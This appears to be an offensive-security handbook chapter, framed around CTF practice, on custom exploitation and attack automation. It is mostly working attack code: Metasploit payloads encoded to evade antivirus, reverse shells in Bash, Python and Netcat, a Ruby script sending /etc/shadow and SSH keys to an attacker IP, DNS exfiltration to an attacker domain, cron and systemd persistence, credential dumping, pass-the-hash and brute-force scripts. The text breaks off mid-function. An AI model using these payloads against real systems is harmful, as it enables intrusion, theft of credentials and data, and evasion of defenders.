**Testing Encoded Payloads:**

Verify encoded payload execution locally (virtual machine):

```bash
./payload_encoded.exe
```

Monitor network connections to confirm callback:

```bash
netstat -tan | grep 4444
```

Successful callback indicates encoding did not break functionality. Test antivirus detection:

```bash
virustotal.com upload payload_encoded.exe
```

[Unverified] VirusTotal scans and displays detection by multiple antivirus vendors; however, results do not guarantee protection against all deployed solutions.

**Advanced AV Evasion Techniques:**

Encoder limitations. [Inference] Modern antivirus employs behavior-based detection and unpacking strategies, potentially defeating encoding-based evasion.

Alternative obfuscation approaches:

1. **Custom shellcode:** Develop non-standard shellcode differing from known meterpreter implementations
2. **Stub injection:** Embed payload within benign executable, triggering payload execution at runtime
3. **Process hollowing:** Spawn legitimate process and replace memory image with malicious payload
4. **Asynchronous execution:** Delay payload execution through sleep loops or environmental checks

Implement custom stub with encoded payload:

```bash
# Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c -o payload.c

# Incorporate into stub executable
gcc -o stub.exe stub.c payload.c
```

Stub.c contains injection logic executing the encoded payload.

**Monitoring Antivirus Effectiveness:**

Test multiple payload variants against target antivirus:

```bash
for i in {1..5}; do
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i $i -f exe -o payload_$i.exe
  # Test each against AV
done
```

Compare detection rates across iterations and encoding chains to identify most effective obfuscation.

Related topics for expanded coverage: Exploit development with custom payloads, post-exploitation module chaining for privilege escalation, and integration of Metasploit with custom reconnaissance tools for automated exploitation workflows.

---

## Custom Exploitation

### Python Exploit Development

Python is the dominant language for exploit development in CTF environments due to its extensive libraries, clean syntax, and powerful networking capabilities.

#### Core Exploitation Libraries

**Pwntools** The primary framework for binary exploitation. Essential functions:

```python
from pwn import *

# Process interaction
p = process('./binary')
p = remote('target.com', 1337)

# Data packing/unpacking
payload = p32(0x41424344)  # 32-bit little-endian
payload = p64(0x4142434445464748)  # 64-bit
address = u32(p.recv(4))  # Unpack received data

# Pattern generation for offset discovery
pattern = cyclic(200)
offset = cyclic_find(0x61616161)

# ROP chain building
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
```

**Socket Programming for Network Exploits**

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('target.com', 9999))

# Send exploit payload
payload = b"A" * 512 + struct.pack("<I", 0xdeadbeef)
s.send(payload)
response = s.recv(1024)
s.close()
```

#### Buffer Overflow Exploit Template

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary_path = './vulnerable_binary'
remote_host = 'target.ctf.com'
remote_port = 1337

# Context setup
context.binary = binary_path
context.log_level = 'debug'
context.arch = 'amd64'  # or 'i386'

# Connection
if args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)

# Exploit parameters
offset = 264
ret_address = 0x08048556

# Build payload
payload = flat([
    b'A' * offset,
    ret_address,
    # Optional: additional arguments
])

# Send and interact
p.sendline(payload)
p.interactive()
```

#### Format String Exploitation

```python
from pwn import *

p = process('./format_vuln')

# Leak addresses from stack
payload = b"%3$p.%4$p.%5$p"  # Read 3rd, 4th, 5th stack values
p.sendline(payload)
leaks = p.recvline()

# Write arbitrary value to address
target_addr = 0x0804a020
value = 0x41424344

# Calculate writes using %n
payload = fmtstr_payload(offset=6, writes={target_addr: value})
p.sendline(payload)
```

#### Shellcode Injection

```python
from pwn import *

context.arch = 'amd64'

# Generate shellcode
shellcode = asm(shellcraft.sh())
# Or manually: shellcode = b"\x31\xc0\x50\x68..."

# NOP sled for reliability
nop_sled = b"\x90" * 100

payload = nop_sled + shellcode + b"A" * (offset - len(nop_sled) - len(shellcode)) + p64(buffer_address)
```

#### ROP Chain Construction

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Build chain for ret2libc
payload = flat([
    b'A' * offset,
    pop_rdi,
    next(elf.search(b'/bin/sh')),
    ret,  # Stack alignment for modern libc
    elf.plt['system']
])
```

#### Reverse Shell Payload

```python
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
```

### Bash Scripting for Exploitation

Bash scripts excel in automation, enumeration, and chaining multiple exploitation steps.

#### Port Scanning and Service Enumeration

```bash
#!/bin/bash

TARGET=$1
PORTS="21 22 23 25 80 443 445 3306 3389 8080"

for PORT in $PORTS; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && \
        echo "[+] Port $PORT is open"
done
```

#### Brute Force Attack Script

```bash
#!/bin/bash

USERNAME="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
TARGET="http://target.com/login"

while IFS= read -r PASSWORD; do
    RESPONSE=$(curl -s -d "username=$USERNAME&password=$PASSWORD" "$TARGET")
    
    if [[ ! $RESPONSE == *"Invalid"* ]]; then
        echo "[+] Valid credentials: $USERNAME:$PASSWORD"
        exit 0
    fi
done < "$WORDLIST"
```

#### Automated SQL Injection Tester

```bash
#!/bin/bash

URL=$1
PARAM=$2

PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1'--"
    "admin'--"
    "' UNION SELECT NULL--"
    "' AND 1=1--"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
    ENCODED=$(echo "$PAYLOAD" | jq -sRr @uri)
    FULL_URL="${URL}?${PARAM}=${ENCODED}"
    
    RESPONSE=$(curl -s "$FULL_URL")
    LENGTH=${#RESPONSE}
    
    echo "[*] Testing: $PAYLOAD | Response length: $LENGTH"
    
    if [[ $RESPONSE == *"error"* ]] || [[ $RESPONSE == *"SQL"* ]]; then
        echo "[!] Potential SQLi detected with payload: $PAYLOAD"
    fi
done
```

#### Privilege Escalation Enumeration

```bash
#!/bin/bash

echo "[*] SUID Binaries"
find / -perm -4000 2>/dev/null

echo -e "\n[*] Writable /etc/passwd"
test -w /etc/passwd && echo "/etc/passwd is writable!"

echo -e "\n[*] Sudo Permissions"
sudo -l 2>/dev/null

echo -e "\n[*] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo -e "\n[*] Capabilities"
getcap -r / 2>/dev/null

echo -e "\n[*] Kernel Version"
uname -a
```

#### File Transfer Automation

```bash
#!/bin/bash

# Download file from attacking machine
download_file() {
    FILE=$1
    ATTACKER_IP=$2
    
    # Try multiple methods
    if command -v wget &> /dev/null; then
        wget "http://$ATTACKER_IP:8000/$FILE"
    elif command -v curl &> /dev/null; then
        curl -O "http://$ATTACKER_IP:8000/$FILE"
    else
        # Fallback to bash
        exec 3<>/dev/tcp/$ATTACKER_IP/8000
        echo -e "GET /$FILE HTTP/1.0\r\n\r\n" >&3
        cat <&3 > "$FILE"
    fi
}
```

#### Reverse Shell Launcher

```bash
#!/bin/bash

ATTACKER_IP=$1
ATTACKER_PORT=$2

# Try multiple reverse shell methods
reverse_shell() {
    # Bash
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null || \
    
    # Netcat with -e
    nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT 2>/dev/null || \
    
    # Netcat without -e
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ATTACKER_IP $ATTACKER_PORT > /tmp/f 2>/dev/null || \
    
    # Python
    python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null
}

reverse_shell &
```

### Perl Exploitation Scripts

Perl remains relevant for legacy systems and offers powerful text processing capabilities.

#### Buffer Overflow Payload Generator

```perl
#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;

my $target = "192.168.1.100";
my $port = 9999;

# Payload components
my $offset = 2003;
my $eip = pack('V', 0x625011af);  # JMP ESP address
my $nop_sled = "\x90" x 16;

# Shellcode (example: reverse shell)
my $shellcode = 
"\x31\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c" .
"\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33";

# Construct buffer
my $buffer = "A" x $offset;
$buffer .= $eip;
$buffer .= $nop_sled;
$buffer .= $shellcode;

# Send payload
my $socket = IO::Socket::INET->new(
    PeerAddr => $target,
    PeerPort => $port,
    Proto    => 'tcp',
) or die "Cannot connect: $!\n";

print $socket $buffer;
close($socket);
```

#### Web Application Fuzzer

```perl
#!/usr/bin/perl
use LWP::UserAgent;
use strict;
use warnings;

my $base_url = "http://target.com/page.php?id=";
my @payloads = (
    "'",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "'; DROP TABLE users--",
);

my $ua = LWP::UserAgent->new;
$ua->timeout(10);

foreach my $payload (@payloads) {
    my $url = $base_url . $payload;
    my $response = $ua->get($url);
    
    if ($response->is_success) {
        my $content = $response->decoded_content;
        
        # Check for SQL errors
        if ($content =~ /(SQL|mysql|syntax|error)/i) {
            print "[+] SQLi detected with payload: $payload\n";
        }
        
        # Check for XSS reflection
        if ($content =~ /\Q$payload\E/) {
            print "[+] XSS reflection with payload: $payload\n";
        }
    }
}
```

#### Brute Force SSH Login

```perl
#!/usr/bin/perl
use Net::SSH::Perl;
use strict;
use warnings;

my $host = $ARGV[0];
my $username = $ARGV[1];
my $wordlist = $ARGV[2];

open(my $fh, '<', $wordlist) or die "Cannot open wordlist: $!\n";

while (my $password = <$fh>) {
    chomp($password);
    
    eval {
        my $ssh = Net::SSH::Perl->new($host, protocol => 2);
        $ssh->login($username, $password);
        print "[+] SUCCESS: $username:$password\n";
        exit(0);
    };
    
    if ($@) {
        print "[-] Failed: $password\n" if $@ =~ /denied/;
    }
}

close($fh);
```

#### CGI Exploit Scanner

```perl
#!/usr/bin/perl
use LWP::UserAgent;
use strict;

my $target = $ARGV[0];
my @cgi_paths = qw(
    /cgi-bin/
    /cgi-sys/
    /cgi-local/
    /htbin/
    /cgi-win/
);

my @vulnerable_scripts = qw(
    test.cgi
    printenv
    test-cgi
    php.cgi
    PHPinfo.cgi
    info.cgi
    test.pl
);

my $ua = LWP::UserAgent->new;

foreach my $path (@cgi_paths) {
    foreach my $script (@vulnerable_scripts) {
        my $url = "http://$target$path$script";
        my $response = $ua->get($url);
        
        if ($response->is_success) {
            print "[+] Found: $url\n";
            
            # Check for shellshock vulnerability
            $ua->default_header('User-Agent' => '() { :; }; echo vulnerable');
            my $ss_response = $ua->get($url);
            if ($ss_response->decoded_content =~ /vulnerable/) {
                print "[!] SHELLSHOCK vulnerable: $url\n";
            }
        }
    }
}
```

### Ruby-Based Exploits

Ruby is heavily integrated into Metasploit and excels at rapid prototype development.

#### Metasploit Module Template

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Buffer Overflow Exploit',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability
      },
      'Author'         => [ 'Your Name' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP3', { 'Ret' => 0x77c35459 } ]
        ],
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def exploit
    connect
    
    buffer = "A" * 2003
    buffer += [target.ret].pack('V')
    buffer += make_nops(16)
    buffer += payload.encoded
    
    sock.put(buffer)
    
    handler
    disconnect
  end
end
```

#### Socket-Based Exploit

```ruby
require 'socket'

target_ip = ARGV[0]
target_port = ARGV[1].to_i

offset = 2003
eip = [0x625011af].pack('V')  # JMP ESP
nops = "\x90" * 16

# Shellcode (msfvenom generated)
shellcode = "\xdb\xc0\xd9\x74\x24\xf4\xba\x8c\x3d\x5e"

buffer = "A" * offset + eip + nops + shellcode

begin
  socket = TCPSocket.new(target_ip, target_port)
  socket.puts(buffer)
  socket.close
  puts "[+] Payload sent successfully"
rescue => e
  puts "[-] Error: #{e.message}"
end
```

#### HTTP Request Fuzzer

```ruby
require 'net/http'
require 'uri'

target_url = "http://target.com/vulnerable.php"
parameter = "id"

payloads = [
  "' OR '1'='1",
  "<script>alert(1)</script>",
  "../../../../etc/passwd",
  "${7*7}",
  "{{7*7}}"
]

payloads.each do |payload|
  uri = URI.parse(target_url)
  params = { parameter => payload }
  uri.query = URI.encode_www_form(params)
  
  begin
    response = Net::HTTP.get_response(uri)
    
    puts "[*] Testing: #{payload}"
    puts "    Status: #{response.code}"
    
    if response.body.include?("error") || response.body.include?("SQL")
      puts "    [!] Potential SQLi detected"
    end
    
    if response.body.include?(payload)
      puts "    [!] Potential XSS detected"
    end
    
  rescue => e
    puts "[-] Error: #{e.message}"
  end
end
```

#### Post-Exploitation File Exfiltration

```ruby
require 'socket'
require 'base64'

attacker_ip = "192.168.1.10"
attacker_port = 4444

files_to_exfiltrate = [
  "/etc/passwd",
  "/etc/shadow",
  "~/.ssh/id_rsa",
  "~/.bash_history"
]

socket = TCPSocket.new(attacker_ip, attacker_port)

files_to_exfiltrate.each do |file_path|
  expanded_path = File.expand_path(file_path)
  
  if File.exist?(expanded_path) && File.readable?(expanded_path)
    content = File.read(expanded_path)
    encoded = Base64.strict_encode64(content)
    
    socket.puts("FILE: #{file_path}")
    socket.puts(encoded)
    socket.puts("EOF")
    
    puts "[+] Exfiltrated: #{file_path}"
  end
end

socket.close
```

#### Automated Command Injection Tester

```ruby
require 'net/http'
require 'uri'

target = "http://vulnerable.com/ping.php"
param = "host"

# Command injection payloads
payloads = [
  "; id",
  "| id",
  "&& id",
  "|| id",
  "`id`",
  "$(id)",
  "; cat /etc/passwd",
  "| nc attacker.com 4444 -e /bin/bash"
]

payloads.each do |payload|
  uri = URI.parse(target)
  uri.query = URI.encode_www_form(param => "127.0.0.1#{payload}")
  
  begin
    response = Net::HTTP.get_response(uri)
    body = response.body
    
    # Look for command output indicators
    if body =~ /uid=\d+/ || body =~ /root:/ || body =~ /bin\/bash/
      puts "[!] VULNERABLE with payload: #{payload}"
      puts "    Response excerpt: #{body[0..200]}"
    else
      puts "[-] No injection with: #{payload}"
    end
    
  rescue => e
    puts "[-] Error with payload #{payload}: #{e.message}"
  end
  
  sleep(0.5)  # Rate limiting
end
```

---

### Important Related Topics

For effective custom exploitation, ensure familiarity with:

- **Shellcode encoding and obfuscation** (alphanumeric, Unicode, polymorphic)
- **Return-oriented programming (ROP) automation tools** (ROPgadget, ropper)
- **Exploit reliability techniques** (egghunters, SEH overwrite, ASLR/DEP bypass)
- **Protocol-specific exploitation** (HTTP, FTP, SMB, DNS tunneling)

---

## Exploitation Automation

### Exploit Chains

Exploit chains combine multiple vulnerabilities or techniques to achieve a final objective when single exploits prove insufficient. Each link in the chain represents a discrete exploitation step that enables the next.

**Common Chain Patterns**

Authentication bypass → privilege escalation → lateral movement represents the classic three-stage chain. Information disclosure → authenticated exploit → persistence demonstrates chains built on initial reconnaissance findings.

**Chain Construction Methodology**

Identify the attack surface by enumerating all accessible services, endpoints, and input vectors. Map dependencies between vulnerabilities by analyzing which exploits create prerequisites for others. Document state requirements including authentication tokens, session data, or system configuration needed between stages.

**Practical Chain Example: Web to System**

```bash
# Stage 1: SQL injection for credential extraction
sqlmap -u "http://target.com/login.php" --forms --batch --dump -T users

# Stage 2: Use extracted credentials for authenticated RCE
curl -X POST http://target.com/admin/upload.php \
  -H "Cookie: session=$EXTRACTED_SESSION" \
  -F "file=@shell.php"

# Stage 3: Reverse shell establishment
nc -lvnp 4444
# Trigger: curl http://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

**Automated Chain Tools**

Metasploit Framework provides `AutoRunScript` for post-exploitation chains:

```bash
# Automatic post-exploitation chain
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/meterpreter/reverse_tcp; \
  set LHOST eth0; \
  set LPORT 4444; \
  set AutoRunScript multi_console_command -rc /root/autorun.rc; \
  exploit -j"
```

Example `autorun.rc` resource file:

```
run post/windows/gather/checkvm
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/credential_collector
run post/windows/escalate/getsystem
```

**Custom Chain Scripting**

Python-based chain automation:

```python
#!/usr/bin/env python3
import requests
import subprocess
import time

class ExploitChain:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.credentials = {}
        
    def stage1_sqli(self):
        """Extract admin credentials via SQLi"""
        payload = "' UNION SELECT username,password FROM users--"
        r = self.session.post(f"http://{self.target}/search", 
                             data={"q": payload})
        # Parse credentials from response
        return self.parse_creds(r.text)
    
    def stage2_auth_bypass(self, creds):
        """Authenticate with extracted credentials"""
        r = self.session.post(f"http://{self.target}/login",
                             data=creds)
        return self.session.cookies.get('admin_token')
    
    def stage3_rce(self, token):
        """Execute reverse shell via authenticated file upload"""
        files = {'file': open('shell.php', 'rb')}
        headers = {'X-Admin-Token': token}
        r = self.session.post(f"http://{self.target}/upload",
                             files=files, headers=headers)
        return r.status_code == 200
    
    def execute(self):
        print("[*] Starting exploit chain")
        creds = self.stage1_sqli()
        token = self.stage2_auth_bypass(creds)
        success = self.stage3_rce(token)
        return success
```

**Chain Validation Techniques**

Verify each stage completes successfully before proceeding. Implement state checks between stages:

```bash
# Check if exploit succeeded before next stage
if curl -s http://target.com/admin | grep -q "Admin Panel"; then
    echo "[+] Stage 1 successful"
    ./stage2_exploit.sh
else
    echo "[-] Stage 1 failed, aborting chain"
    exit 1
fi
```

### Multi-Stage Exploitation

Multi-stage exploitation refers to phased attack progression where each stage establishes capabilities for subsequent stages, distinct from chains which focus on vulnerability sequences.

**Stage Architecture Models**

**Initial Access Stage**

Focuses on establishing first foothold through exposed services:

```bash
# Comprehensive initial access scan
nmap -sV -sC -p- --min-rate 1000 -oA initial_scan $TARGET

# Identify exploitable services
searchsploit --nmap initial_scan.xml

# Deploy initial payload
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=$ATTACKER_IP LPORT=4444 \
  -f elf -o payload
```

**Persistence Stage**

Establishes reliable re-entry mechanisms:

```bash
# SSH key persistence
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron-based persistence
echo "*/5 * * * * /tmp/.hidden/callback.sh" | crontab -

# Systemd service persistence
cat > /etc/systemd/system/updater.service << EOF
[Unit]
Description=System Updater

[Service]
ExecStart=/usr/local/bin/update_daemon
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater.service
```

**Privilege Escalation Stage**

Elevates access to administrative levels:

```bash
# Automated privesc enumeration
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > privesc_audit.txt

# Kernel exploit identification
uname -a
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# SUID binary exploitation
find / -perm -4000 2>/dev/null | xargs ls -la
```

**Lateral Movement Stage**

Propagates access across network infrastructure:

```bash
# Network discovery from compromised host
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && \
    echo "192.168.1.$i is alive"
done

# Credential dumping for lateral movement
python3 /opt/impacket/examples/secretsdump.py \
  LOCAL -sam sam.save -security security.save -system system.save

# Pass-the-hash lateral movement
python3 /opt/impacket/examples/psexec.py \
  administrator@192.168.1.50 -hashes :$NTLM_HASH
```

**Objective Completion Stage**

Achieves final goal (data exfiltration, system disruption):

```bash
# Locate sensitive data
find / -type f \( -name "*.kdbx" -o -name "*.key" -o -name "*password*" \) 2>/dev/null

# Staged exfiltration to avoid detection
tar czf - /root/sensitive_data | \
  openssl enc -aes-256-cbc -salt -pass pass:$KEY | \
  split -b 10M - /tmp/exfil_part_

# DNS-based exfiltration for stealth
for file in /tmp/sensitive/*; do
    xxd -p $file | while read line; do
        dig $line.exfil.attacker.com @$DNS_SERVER
    done
done
```

**Stage Transition Management**

Implement staging controllers to manage progression:

```python
#!/usr/bin/env python3
import sys
from enum import Enum

class Stage(Enum):
    INITIAL_ACCESS = 1
    PERSISTENCE = 2
    PRIVILEGE_ESCALATION = 3
    LATERAL_MOVEMENT = 4
    OBJECTIVE = 5

class MultiStageExploit:
    def __init__(self):
        self.current_stage = Stage.INITIAL_ACCESS
        self.stage_results = {}
        
    def advance_stage(self, result):
        """Progress to next stage based on current result"""
        if not result['success']:
            print(f"[-] Stage {self.current_stage.name} failed")
            return False
            
        self.stage_results[self.current_stage] = result
        
        if self.current_stage == Stage.INITIAL_ACCESS:
            self.current_stage = Stage.PERSISTENCE
        elif self.current_stage == Stage.PERSISTENCE:
            self.current_stage = Stage.PRIVILEGE_ESCALATION
        elif self.current_stage == Stage.PRIVILEGE_ESCALATION:
            self.current_stage = Stage.LATERAL_MOVEMENT
        elif self.current_stage == Stage.LATERAL_MOVEMENT:
            self.current_stage = Stage.OBJECTIVE
            
        return True
    
    def execute_stage(self):
        """Execute current stage exploitation"""
        handlers = {
            Stage.INITIAL_ACCESS: self.stage_initial_access,
            Stage.PERSISTENCE: self.stage_persistence,
            Stage.PRIVILEGE_ESCALATION: self.stage_privesc,
            Stage.LATERAL_MOVEMENT: self.stage_lateral,
            Stage.OBJECTIVE: self.stage_objective
        }
        return handlers[self.current_stage]()
```

**Rollback Mechanisms**

[Inference] Implementing stage rollback prevents detection from failed exploitation attempts:

```bash
# Snapshot system state before stage execution
function create_checkpoint() {
    CHECKPOINT_ID=$(date +%s)
    echo $$ > /tmp/.checkpoint_$CHECKPOINT_ID
    # Store process list, network connections
    ps aux > /tmp/.ps_$CHECKPOINT_ID
    netstat -tulpn > /tmp/.net_$CHECKPOINT_ID
}

# Clean up artifacts if stage fails
function rollback() {
    CHECKPOINT_ID=$1
    # Kill spawned processes
    while read pid; do
        kill -9 $pid 2>/dev/null
    done < /tmp/.checkpoint_$CHECKPOINT_ID
    # Remove created files
    rm -f /tmp/.checkpoint_* /tmp/.ps_* /tmp/.net_*
}
```

### Conditional Exploitation Paths

Conditional exploitation adapts attack vectors based on runtime environment analysis, target responses, and defensive posture detection.

**Decision Tree Implementation**

Build exploitation logic that branches based on reconnaissance data:

```python
#!/usr/bin/env python3
import nmap
import subprocess

class ConditionalExploit:
    def __init__(self, target):
        self.target = target
        self.os_type = None
        self.services = {}
        
    def reconnaissance(self):
        """Gather target information for decision making"""
        nm = nmap.PortScanner()
        nm.scan(self.target, arguments='-O -sV')
        
        # Determine OS
        if 'osmatch' in nm[self.target]:
            self.os_type = nm[self.target]['osmatch'][0]['name']
        
        # Catalog services
        for proto in nm[self.target].all_protocols():
            ports = nm[self.target][proto].keys()
            for port in ports:
                self.services[port] = nm[self.target][proto][port]
                
    def select_exploit_path(self):
        """Choose exploitation strategy based on target profile"""
        if 'Windows' in self.os_type:
            return self.windows_path()
        elif 'Linux' in self.os_type:
            return self.linux_path()
        else:
            return self.generic_path()
    
    def windows_path(self):
        """Windows-specific exploitation logic"""
        if 445 in self.services:  # SMB available
            if self.check_eternalblue():
                return self.exploit_eternalblue()
            else:
                return self.smb_relay_attack()
        elif 3389 in self.services:  # RDP available
            return self.rdp_bruteforce()
    
    def linux_path(self):
        """Linux-specific exploitation logic"""
        if 22 in self.services:  # SSH available
            ssh_version = self.services[22].get('version', '')
            if 'OpenSSH 7.4' in ssh_version:
                return self.exploit_ssh_enum()
            else:
                return self.ssh_key_auth_bypass()
        elif 80 in self.services or 443 in self.services:
            return self.web_exploitation_path()
```

**Runtime Environment Detection**

Adapt exploitation based on defensive measures:

```bash
#!/bin/bash

# Detect presence of security tools
function detect_defenses() {
    # Check for AV/EDR
    if ps aux | grep -iE 'defender|crowdstrike|carbon' | grep -v grep; then
        echo "av_detected"
    fi
    
    # Check for HIDS
    if [ -f /var/ossec/bin/ossec-control ] || [ -f /usr/sbin/aide ]; then
        echo "hids_detected"
    fi
    
    # Check firewall rules
    if iptables -L | grep -q DROP; then
        echo "restrictive_firewall"
    fi
}

# Select exploitation technique based on defenses
DEFENSES=$(detect_defenses)

if echo "$DEFENSES" | grep -q "av_detected"; then
    # Use obfuscated payload
    msfvenom -p windows/meterpreter/reverse_tcp \
      LHOST=$ATTACKER LPORT=443 \
      -e x86/shikata_ga_nai -i 10 \
      -f exe -o payload_obfuscated.exe
elif echo "$DEFENSES" | grep -q "hids_detected"; then
    # Use fileless exploitation
    ./fileless_exploit.sh
else
    # Standard exploitation
    ./standard_exploit.sh
fi
```

**Service-Specific Conditionals**

Branch exploitation based on service versions and configurations:

```bash
#!/bin/bash

TARGET=$1
PORT=80

# Probe web server type
SERVER_HEADER=$(curl -sI http://$TARGET:$PORT | grep -i "server:" | cut -d' ' -f2-)

case "$SERVER_HEADER" in
    *Apache/2.4.49*)
        echo "[+] Vulnerable Apache version detected"
        ./exploits/apache_path_traversal.sh $TARGET $PORT
        ;;
    *nginx*)
        echo "[+] Nginx detected, checking for misconfigurations"
        ./exploits/nginx_alias_traversal.sh $TARGET $PORT
        ;;
    *IIS*)
        IIS_VERSION=$(echo $SERVER_HEADER | grep -oP '\d+\.\d+')
        if [[ $(echo "$IIS_VERSION < 10.0" | bc) -eq 1 ]]; then
            ./exploits/iis_webdav.sh $TARGET $PORT
        fi
        ;;
    *)
        echo "[*] Unknown server, attempting generic exploits"
        ./exploits/generic_web.sh $TARGET $PORT
        ;;
esac
```

**Payload Selection Logic**

Choose payloads dynamically based on target constraints:

```python
#!/usr/bin/env python3
import socket
import subprocess

def test_outbound_connectivity(target, ports=[80, 443, 53, 8080]):
    """Test which ports allow outbound connections"""
    allowed_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            if result == 0:
                allowed_ports.append(port)
            sock.close()
        except:
            pass
    return allowed_ports

def select_payload(target, attacker_ip):
    """Select payload based on connectivity constraints"""
    allowed_ports = test_outbound_connectivity(target)
    
    if 443 in allowed_ports:
        # HTTPS reverse shell - most likely to bypass egress filtering
        payload = f"windows/meterpreter/reverse_https"
        lport = 443
    elif 53 in allowed_ports:
        # DNS tunnel - works even with strict egress
        payload = f"windows/dns_tunnel"
        lport = 53
    elif not allowed_ports:
        # No outbound access - use bind shell
        payload = f"windows/meterpreter/bind_tcp"
        lport = 4444
    else:
        # Standard reverse TCP
        payload = f"windows/meterpreter/reverse_tcp"
        lport = allowed_ports[0]
    
    cmd = [
        "msfvenom",
        "-p", payload,
        "LHOST=" + attacker_ip,
        "LPORT=" + str(lport),
        "-f", "exe",
        "-o", f"payload_{lport}.exe"
    ]
    
    subprocess.run(cmd)
    return payload, lport
```

**Fallback Exploitation Strategies**

Implement cascading fallback mechanisms:

```bash
#!/bin/bash

TARGET=$1
EXPLOIT_PRIORITY=(
    "exploit_primary"
    "exploit_secondary"
    "exploit_tertiary"
    "exploit_last_resort"
)

for exploit in "${EXPLOIT_PRIORITY[@]}"; do
    echo "[*] Attempting $exploit"
    
    if ./$exploit.sh $TARGET; then
        echo "[+] Exploitation successful with $exploit"
        exit 0
    else
        echo "[-] $exploit failed, trying next method"
    fi
done

echo "[!] All exploitation methods exhausted"
exit 1
```

**Conditional Privilege Escalation**

Select privilege escalation vector based on system configuration:

```bash
#!/bin/bash

# Detect available privesc vectors
function detect_privesc_vectors() {
    vectors=()
    
    # Check for SUID binaries
    if find / -perm -4000 -type f 2>/dev/null | grep -qE 'nmap|vim|find'; then
        vectors+=("suid")
    fi
    
    # Check for sudo misconfigurations
    if sudo -l 2>/dev/null | grep -q NOPASSWD; then
        vectors+=("sudo")
    fi
    
    # Check for kernel exploits
    KERNEL=$(uname -r)
    if searchsploit linux kernel $KERNEL 2>/dev/null | grep -qi "privilege escalation"; then
        vectors+=("kernel")
    fi
    
    # Check for writable /etc/passwd
    if [ -w /etc/passwd ]; then
        vectors+=("passwd_write")
    fi
    
    echo "${vectors[@]}"
}

# Execute highest probability vector first
VECTORS=($(detect_privesc_vectors))

for vector in "${VECTORS[@]}"; do
    case "$vector" in
        "passwd_write")
            echo "[+] Exploiting writable /etc/passwd"
            echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
            su root2
            ;;
        "sudo")
            echo "[+] Exploiting sudo misconfiguration"
            sudo -l | grep NOPASSWD | awk '{print $NF}' | while read cmd; do
                sudo $cmd
            done
            ;;
        "suid")
            echo "[+] Exploiting SUID binary"
            # Execute appropriate SUID exploit
            ;;
        "kernel")
            echo "[+] Attempting kernel exploit"
            # Compile and execute kernel exploit
            ;;
    esac
done
```

**Success Validation and Path Adjustment**

Verify exploitation success before proceeding:

```python
#!/usr/bin/env python3
import socket
import time
import logging
from typing import Tuple

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

def is_port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    """Return True if TCP connect succeeds (simple liveness check)."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def validate_shell_access(host: str, port: int, probe_cmd: bytes = b'id\n', timeout: float = 2.0) -> bool:
    """
    Conservative check: try to connect and optionally read a small banner.
    NOTE: This does NOT attempt to send exploit commands — only checks connectivity.
    """
    try:
